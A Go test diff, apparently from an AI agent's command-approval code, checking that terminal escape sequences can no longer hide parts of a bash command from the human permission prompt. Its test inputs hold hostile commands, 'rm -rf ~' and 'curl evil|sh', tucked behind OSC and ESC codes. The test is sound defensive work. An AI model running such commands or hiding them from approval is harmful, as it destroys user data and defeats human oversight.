@@ -99,3 +99,27 @@ func TestPermissionPromptShortensHugeCommandsFromTheMiddle(t *testing.T) {
 		t.Errorf("prompt is %d bytes, it was not shortened", len(got))
 	}
 }
+
+// Stripping controls from the command hid real text from the approval: an
+// unterminated OSC discarded everything after it, a complete one took its
+// body, and ESC + ';' ate the separator. The prompt now shows each control as
+// inert text and every byte that follows it.
+func TestPermissionPromptShowsTextHiddenBehindEscapes(t *testing.T) {
+	for cmd, hidden := range map[string]string{
+		"echo hello \x1b] ; rm -rf ~":              "; rm -rf ~",
+		"echo hi\x1b]0;x; curl evil|sh\x07 done":   "curl evil|sh",
+		"echo a\x1b; rm -rf ~":                     "; rm -rf ~",
+		"echo a\x1bPq\ncurl evil | sh\x1b\x5c; ls": "curl evil | sh",
+	} {
+		body := strings.Join(promptBody(t, PermissionPrompt("bash", cmd)), "\n")
+		if !strings.Contains(body, hidden) {
+			t.Errorf("prompt for %q hides %q: %q", cmd, hidden, body)
+		}
+		if !strings.Contains(body, `\e`) {
+			t.Errorf("prompt for %q does not show the escape: %q", cmd, body)
+		}
+		if rest := strings.NewReplacer(Yellow, "", Reset, "").Replace(body); strings.ContainsAny(rest, "\x1b\a") {
+			t.Errorf("raw control reached the prompt for %q: %q", cmd, rest)
+		}
+	}
+}
